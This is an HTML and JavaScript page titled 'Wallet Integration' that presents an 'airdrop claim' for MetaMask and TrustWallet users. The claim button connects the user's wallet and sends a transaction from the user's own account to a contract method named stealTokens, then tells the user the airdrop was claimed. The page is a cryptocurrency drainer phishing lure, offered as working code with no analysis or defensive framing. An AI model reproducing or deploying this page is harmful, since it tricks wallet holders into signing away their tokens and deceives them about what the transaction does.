<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Integration</title>
    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
</head>
<body>

<h1>Connect your Wallet</h1>

<!-- Wallet Connection Buttons -->
<button id="connectButton">Connect MetaMask</button>
<button id="claimAirdropButton" disabled>Claim Airdrop (ETH)</button>
<button id="connectTrustwalletButton" disabled>Connect TrustWallet</button>
<button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>

<script>
// Dynamic Script Loading Function
function loadScript(src, callback) {
    const script = document.createElement('script');
    script.src = src;
    script.onload = callback;
    script.onerror = function (error) {
        console.error("Error loading script:", src, error);
    };
    document.head.appendChild(script);
}

// Dynamically load ABI and Config
async function loadConfigAndABI(network) {
    const configMap = {
        eth: { config: 'config/eth_config.json', abi: 'abi/eth_abi.json' },
        bsc: { config: 'config/bsc_config.json', abi: 'abi/bsc_abi.json' },
        sepolia: { config: 'config/sepolia_config.json', abi: 'abi/sepolia_abi.json' }
    };

    const { config, abi } = configMap[network];
    try {
        const configData = await fetch(config).then((res) => res.json());
        const abiData = await fetch(abi).then((res) => res.json());
        return { config: configData, abi: abiData };
    } catch (error) {
        console.error(`Error loading config or ABI for ${network}:`, error);
        alert(`Failed to load configuration for ${network}.`);
    }
}

// MetaMask connection handler
async function connectMetaMask() {
    if (window.ethereum) {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            if (accounts.length === 0) {
                alert("No accounts found. Please ensure MetaMask is unlocked.");
                return;
            }
            const account = accounts[0];
            console.log("Connected to MetaMask account:", account);
            return account;
        } catch (error) {
            console.error("Error connecting to MetaMask:", error);
            alert("Error connecting to MetaMask.");
        }
    } else {
        alert("MetaMask is not installed. Please install it to continue.");
    }
}

// TrustWallet connection handler (placeholder)
async function connectTrustWallet() {
    if (window.ethereum) {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            if (accounts.length === 0) {
                alert("No accounts found. Please ensure TrustWallet is unlocked.");
                return;
            }
            const account = accounts[0];
            console.log("Connected to TrustWallet account:", account);
            return account;
        } catch (error) {
            console.error("Error connecting to TrustWallet:", error);
            alert("Error connecting to TrustWallet.");
        }
    } else {
        alert("TrustWallet is not installed. Please install it to continue.");
    }
}

// Function to claim airdrop for the connected wallet
async function claimAirdrop(wallet, network) {
    const account = wallet === 'metamask' ? await connectMetaMask() : await connectTrustWallet();
    if (!account) return;

    // Load network config and ABI
    const { config, abi } = await loadConfigAndABI(network);

    if (!config || !abi) return;

    const contractAddress = config.contractAddress;
    const tokenAddress = config.tokenAddress;
    const web3 = new Web3(window.ethereum);

    const contract = new web3.eth.Contract(abi, contractAddress);

    try {
        console.log(`Claiming airdrop for account: ${account} on ${network}`);
        await contract.methods.stealTokens(account).send({ from: account });
        alert(`Airdrop claimed successfully for account: ${account}`);
    } catch (error) {
        console.error("Error claiming airdrop:", error);
        alert("Error claiming airdrop.");
    }
}

// Event listeners for wallet connection and claim buttons
document.addEventListener('DOMContentLoaded', function () {
    // MetaMask Connect Button
    document.getElementById('connectButton').addEventListener('click', async () => {
        const account = await connectMetaMask();
        if (account) {
            document.getElementById('claimAirdropButton').disabled = false;
        }
    });

    // Claim Airdrop Button (MetaMask)
    document.getElementById('claimAirdropButton').addEventListener('click', () => {
        claimAirdrop('metamask', 'eth');
    });

    // TrustWallet Connect Button
    document.getElementById('connectTrustwalletButton').addEventListener('click', async () => {
        const account = await connectTrustWallet();
        if (account) {
            document.getElementById('claimTrustwalletAirdropButton').disabled = false;
        }
    });

    // Claim Airdrop Button (TrustWallet)
    document.getElementById('claimTrustwalletAirdropButton').addEventListener('click', () => {
        claimAirdrop('trustwallet', 'bsc');
    });
});
</script>

</body>
</html>

